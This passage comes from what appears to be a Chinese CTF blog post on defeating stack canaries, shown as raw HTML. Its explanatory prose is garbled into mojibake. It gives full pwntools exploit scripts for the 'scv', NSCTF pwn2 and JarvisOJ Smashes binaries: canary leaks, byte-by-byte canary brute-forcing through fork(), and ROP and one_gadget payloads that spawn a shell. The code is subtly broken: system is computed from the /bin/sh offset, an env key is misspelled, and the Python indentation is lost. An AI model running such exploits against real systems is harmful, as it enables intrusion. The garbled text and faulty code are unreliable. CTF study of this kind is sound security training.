class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">        v14 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"-------------------------"</span>);</span><br><span class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v14, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">        <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"&gt;&gt;"</span>);</span><br><span class="line">        v25 = read(<span class="number">0</span>, &amp;buf, <span class="number">0xF8</span>uLL);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        v21 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"[*]DO NOT HURT MY SCV...."</span>);</span><br><span class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v21, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨<code>case 1</code>å­˜åœ¨<code>buffer overflow</code>ï¼Œé€šè¿‡è°ƒè¯•è§‚å¯Ÿåˆ°è¾“å…¥ä¸<code>Canary</code>ä¹‹é—´çš„åç§»ä¸º168ã€‚å¦‚æœè¦æ³„æ¼<code>Canary</code>çš„è¯ï¼Œå°±å¿…é¡»è®©æ‰€æœ‰çš„<code>\x00</code>è¢«è¦†ç›–æ‰ï¼ŒåŒ…æ‹¬<code>Canary</code>ä½ä½çš„<code>\x00</code>ï¼Œä»¥è®©<code>puts</code>è®¤ä¸ºbufè¿åŒ<code>Canary</code>ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ã€‚libcä¹Ÿå¯ä»¥ç”¨åŒæ ·çš„æ–¹å¼æ³„æ¼ï¼Œæœ€åæ”¾ä¸Šexpï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">'./scv'</span>, env=&#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libc-2.23.so'</span>&#125;)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'127.0.0.1'</span>, <span class="number">8888</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./scv'</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">system_offset = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">str_bin_sh_offset = next(libc.search(<span class="string">'/bin/sh'</span>))</span><br><span class="line">log.success(<span class="string">'system_offset = '</span> + hex(system_offset))</span><br><span class="line">log.success(<span class="string">'str_bin_sh_offset = '</span> + hex(str_bin_sh_offset))</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400ea3</span></span><br><span class="line">log.success(<span class="string">'pop_rdi_ret = '</span> + hex(pop_rdi_ret))</span><br><span class="line">one_gadget_offset = <span class="number">0x45216</span></span><br><span class="line">log.success(<span class="string">'one_gadget_offset = '</span> + hex(one_gadget_offset))</span><br><span class="line">libc_base_offset = <span class="number">0x3a20a</span></span><br><span class="line">log.success(<span class="string">'libc_base_offset = '</span> + hex(libc_base_offset))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt;&gt;'</span>, <span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt;&gt;'</span>, <span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span><span class="params">()</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt;&gt;'</span>, <span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="string">'A'</span> * (<span class="number">40</span> - <span class="number">1</span>) + <span class="string">':'</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">log.success(<span class="string">'leak_addr = '</span> + hex(leak_addr))</span><br><span class="line">libc_base = leak_addr - libc_base_offset</span><br><span class="line">log.success(<span class="string">'libc_base = '</span> + hex(libc_base))</span><br><span class="line">system = libc_base + str_bin_sh_offset</span><br><span class="line">str_bin_sh = libc_base + str_bin_sh_offset</span><br><span class="line">log.success(<span class="string">'system = '</span> + hex(system))</span><br><span class="line">log.success(<span class="string">'str_bin_sh = '</span> + hex(str_bin_sh))</span><br><span class="line">edit(<span class="string">'A'</span> * <span class="number">168</span> + <span class="string">':'</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">canary = u64(<span class="string">'\x00'</span> + p.recv(<span class="number">7</span>))</span><br><span class="line">log.success(<span class="string">'canary = '</span> + hex(canary))</span><br><span class="line">payload = flat([</span><br><span class="line"><span class="string">'A'</span> * <span class="number">168</span>, </span><br><span class="line">canary, </span><br><span class="line"><span class="string">'B'</span> * <span class="number">8</span>, </span><br><span class="line">pop_rdi_ret, </span><br><span class="line">str_bin_sh, </span><br><span class="line">system</span><br><span class="line">])</span><br><span class="line">edit(payload)</span><br><span class="line">quit()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="çˆ†ç ´Canary"><a href="#çˆ†ç ´Canary" class="headerlink" title="çˆ†ç ´Canary"></a>çˆ†ç ´<code>Canary</code></h2><p><code>Canary</code>ä¹‹æ‰€ä»¥è¢«è®¤ä¸ºæ˜¯å®‰å…¨çš„ï¼Œæ˜¯å› ä¸ºå¯¹å…¶è¿›è¡Œçˆ†ç ´æˆåŠŸç‡å¤ªä½ã€‚ä»¥32ä½ç¨‹åºä¸ºä¾‹ï¼Œé™¤å»æœ€åä¸€ä¸ª<code>\x00</code>ï¼Œå…¶å¯èƒ½å€¼å°†ä¼šæ˜¯<code>0x100^3=16777216</code>ï¼ˆå®é™…ä¸Šç”±äº<code>Canary</code>çš„ç”Ÿæˆè§„åˆ™ä¼šå°äºè¿™ä¸ªå€¼ï¼‰ï¼Œ64ä½ä¸‹çš„<code>Canary</code>å€¼æ›´æ˜¯è¿œå¤§äºè¿™ä¸ªæ•°é‡çº§ã€‚æ­¤å¤–ï¼Œä¸€æ—¦<code>Canary</code>çˆ†ç ´å¤±è´¥ï¼Œç¨‹åºå°±ä¼šç«‹å³ç»“æŸï¼Œ<code>Canary</code>å€¼ä¹Ÿä¼šå†æ¬¡æ›´æ–°ï¼Œä½¿å¾—çˆ†ç ´æ›´åŠ å›°éš¾ã€‚ä½†æ˜¯åŒä¸€ä¸ªè¿›ç¨‹å†…æ‰€æœ‰çš„<code>Canary</code>å€¼éƒ½æ˜¯ä¸€è‡´çš„ï¼Œå½“ç¨‹åºæœ‰å¤šä¸ªè¿›ç¨‹ï¼Œä¸”å­è¿›ç¨‹å†…å‡ºç°äº†æ ˆæº¢å‡ºæ—¶ï¼Œç”±äºå­è¿›ç¨‹å´©æºƒä¸ä¼šå½±å“åˆ°ä¸»è¿›ç¨‹ï¼Œæˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œçˆ†ç ´ã€‚ç”šè‡³æˆ‘ä»¬å¯ä»¥é€šè¿‡é€ä½çˆ†ç ´æ¥å‡å°‘çˆ†ç ´æ—¶é—´ã€‚</p><h3 id="2017-NSCTF-pwn2"><a href="#2017-NSCTF-pwn2" class="headerlink" title="2017-NSCTF-pwn2"></a>2017-NSCTF-pwn2</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] '/home/assassinq/pwn/ctf-wiki/canary/2017-NSCTF-pwn2/pwn2'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>å¼€å¯äº†<code>Canary</code>ã€‚mainå‡½æ•°ä¸­çœ‹åˆ°åªè¦æ¯æ¬¡å›ç­”<code>Y</code>ï¼Œå¯ä»¥æ— é™æ¬¡åœ°forkå‡ºæ–°çš„è¿›ç¨‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1; <span class="comment">// [esp+1Bh] [ebp-5h]</span></span><br><span class="line">  <span class="keyword">__pid_t</span> pid; <span class="comment">// [esp+1Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"[*] Do you love me?[Y]\n"</span>, <span class="number">0x17</span>u);</span><br><span class="line">    <span class="keyword">if</span> ( getchar() != <span class="string">'Y'</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v1 = getchar();</span><br><span class="line">    <span class="keyword">while</span> ( v1 != <span class="string">'\n'</span> &amp;&amp; v1 )</span><br><span class="line">      ;</span><br><span class="line">    pid = fork();</span><br><span class="line">    <span class="keyword">if</span> ( pid )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( pid &lt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( pid &lt; <span class="number">0</span> )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>                                      <span class="comment">// son</span></span><br><span class="line">      &#123;</span><br><span class="line">        wait(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>                                        <span class="comment">// father</span></span><br><span class="line">    &#123;</span><br><span class="line">      func();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>func()</code>å‡½æ•°ä¸­å­˜åœ¨<code>buffer overflow</code>ï¼Œè€Œä¸”è¿˜å­˜åœ¨<code>format string</code>ï¼Œé‚£è¿™é‡Œå…¶å®æ˜¯å¯ä»¥ç”¨è¿™ä¸ªæ¼æ´æ³„æ¼å‡º<code>Canary</code>çš„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *s; <span class="comment">// ST18_4</span></span><br><span class="line">  <span class="keyword">int</span> buf; <span class="comment">// [esp+1Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+20h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+24h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+28h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  buf = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  s = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x40</span>u);</span><br><span class="line">  input_name(&amp;buf);</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">"[*] Welcome to the game %s"</span>, &amp;buf);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"[*] Input Your Id:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Canary</code>é‡‡ç”¨çˆ†ç ´çš„æ–¹æ³•ï¼Œlibcåˆ™å¯ä»¥ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„æ¼ã€‚æ”¾ä¸Šé€å­—èŠ‚çˆ†ç ´expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line">p = process(<span class="string">'./pwn2'</span>, env=&#123;<span class="string">'LD_RELOAD'</span>:<span class="string">'./libc.so.6_x86'</span>&#125;)</span><br><span class="line">elf = ELF(<span class="string">'./pwn2'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6_x86'</span>)</span><br><span class="line">system_offset = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">str_bin_sh_offset = next(libc.search(<span class="string">'/bin/sh'</span>))</span><br><span class="line">log.success(<span class="string">'system_offset = '</span> + hex(system_offset))</span><br><span class="line">log.success(<span class="string">'str_bin_sh_offset = '</span> + hex(str_bin_sh_offset))</span><br><span class="line">libc_offset = <span class="number">0x1b2000</span></span><br><span class="line">log.success(<span class="string">'libc_offset = '</span> + hex(libc_offset))</span><br><span class="line">one_gadget_offset = <span class="number">0x3af1c</span></span><br><span class="line">log.success(<span class="string">'one_gadget_offset = '</span> + hex(one_gadget_offset))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">forkNew</span><span class="params">()</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'[Y]'</span>, <span class="string">'Y'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inputName</span><span class="params">(name)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'[*] Input Your name please:'</span>)</span><br><span class="line">p.send(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inputId</span><span class="params">(Id)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'[*] Input Your Id:'</span>)</span><br><span class="line">p.send(Id)</span><br><span class="line"></span><br><span class="line">canary = <span class="string">'\x00'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line"><span class="comment"># log.info('try ' + hex(j))</span></span><br><span class="line"><span class="keyword">if</span> i != <span class="number">0</span> <span class="keyword">and</span> j == <span class="number">0</span>:</span><br><span class="line">p.sendline(<span class="string">'Y'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">forkNew()</span><br><span class="line">inputName(<span class="string">'%12$p\n'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'[*] Welcome to the game '</span>)</span><br><span class="line">leak_addr = int(p.recv(<span class="number">10</span>), <span class="number">16</span>)</span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">16</span></span><br><span class="line">payload += canary</span><br><span class="line">payload += chr(j)</span><br><span class="line">inputId(payload)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="keyword">if</span> <span class="string">'smashing'</span> <span class="keyword">not</span> <span class="keyword">in</span>  p.recv():</span><br><span class="line">canary += chr(j)</span><br><span class="line">log.info(<span class="string">'At round %d find canary byte %#x'</span> %(i, j))</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">'canary = '</span> + hex(u32(canary)))</span><br><span class="line">log.success(<span class="string">'leak_addr = '</span> + hex(leak_addr))</span><br><span class="line">libc_base = leak_addr - libc_offset</span><br><span class="line">log.success(<span class="string">'libc_base = '</span> + hex(libc_base))</span><br><span class="line">system = libc_base + system_offset</span><br><span class="line">str_bin_sh = libc_base + str_bin_sh_offset</span><br><span class="line">one_gadget = libc_base + one_gadget_offset</span><br><span class="line">log.success(<span class="string">'system = '</span> + hex(system))</span><br><span class="line">log.success(<span class="string">'str_bin_sh = '</span> + hex(str_bin_sh))</span><br><span class="line">log.success(<span class="string">'one_gadget = '</span> + hex(one_gadget))</span><br><span class="line">p.sendline(<span class="string">'Y'</span>)</span><br><span class="line">inputName(<span class="string">'AssassinQ\n'</span>)</span><br><span class="line">payload = flat([</span><br><span class="line"><span class="string">'A'</span> * <span class="number">16</span>, </span><br><span class="line">canary, </span><br><span class="line"><span class="string">'B'</span> * <span class="number">12</span>, </span><br><span class="line">one_gadget</span><br><span class="line">])</span><br><span class="line">inputId(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="SSPï¼ˆStack-Smashing-Protectï¼‰-Leak"><a href="#SSPï¼ˆStack-Smashing-Protectï¼‰-Leak" class="headerlink" title="SSPï¼ˆStack Smashing Protectï¼‰ Leak"></a><code>SSPï¼ˆStack Smashing Protectï¼‰ Leak</code></h2><p>é™¤äº†é€šè¿‡å„ç§æ–¹æ³•æ³„éœ²<code>Canary</code>ä¹‹å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥åˆ©ç”¨<code>__stack_chk_fail</code>å‡½æ•°æ³„éœ²ä¿¡æ¯ã€‚è¿™ç§æ–¹æ³•ä½œç”¨ä¸å¤§ï¼Œæ²¡åŠæ³•è®©æˆ‘ä»¬<code>get shell</code>ã€‚ä½†æ˜¯å½“æˆ‘ä»¬éœ€è¦æ³„éœ²çš„flagæˆ–è€…å…¶ä»–ä¸œè¥¿å­˜åœ¨äºå†…å­˜ä¸­æ—¶ï¼Œæˆ‘ä»¬å¯èƒ½å¯ä»¥ä½¿ç”¨ä¸€ä¸ªæ ˆæº¢å‡ºæ¼æ´æ¥æŠŠå®ƒä»¬æ³„éœ²å‡ºæ¥ã€‚è¿™ä¸ªæ–¹æ³•å«åš<code>SSPï¼ˆStack Smashing Protectï¼‰ Leak</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) __stack_chk_fail (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (<span class="string">"stack smashing detected"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) internal_function __fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">"*** %s ***: %s terminated\n"</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">"&lt;unknown&gt;"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/pics/ç»•è¿‡ELFçš„å®‰å…¨é˜²æŠ¤æœºåˆ¶Canary/1.png" alt="SSP Leak"></p><h3 id="JarvisOJ-Smashes"><a href="#JarvisOJ-Smashes" class="headerlink" title="JarvisOJ-Smashes"></a>JarvisOJ-Smashes</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] '/home/assassinq/pwn/ctf-wiki/canary/JarvisOJ-Smashes/smashes'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>å¼€äº†<code>Canary</code>ï¼Œå­˜åœ¨æº¢å‡ºä½†æ˜¯æ²¡æ³•æ³„æ¼ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">sub_4007E0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 i; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> c; <span class="comment">// eax</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+0h] [rbp-128h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+108h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __printf_chk(<span class="number">1L</span>L, <span class="string">"Hello!\nWhat's your name? "</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !_IO_gets((__int64)&amp;v3) )</span><br><span class="line">LABEL_9:</span><br><span class="line">    _exit(<span class="number">1</span>);</span><br><span class="line">  i = <span class="number">0L</span>L;</span><br><span class="line">  __printf_chk(<span class="number">1L</span>L, <span class="string">"Nice to meet you, %s.\nPlease overwrite the flag: "</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    c = _IO_getc(<span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">if</span> ( c == <span class="number">-1</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">    <span class="keyword">if</span> ( c == <span class="string">'\n'</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    flag[i++] = c;</span><br><span class="line">    <span class="keyword">if</span> ( i == <span class="number">32</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memset</span>((<span class="keyword">void</span> *)((<span class="keyword">signed</span> <span class="keyword">int</span>)i + <span class="number">6294816L</span>L), <span class="number">0</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(<span class="number">32</span> - i));</span><br><span class="line">LABEL_8:</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Thank you, bye!"</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span 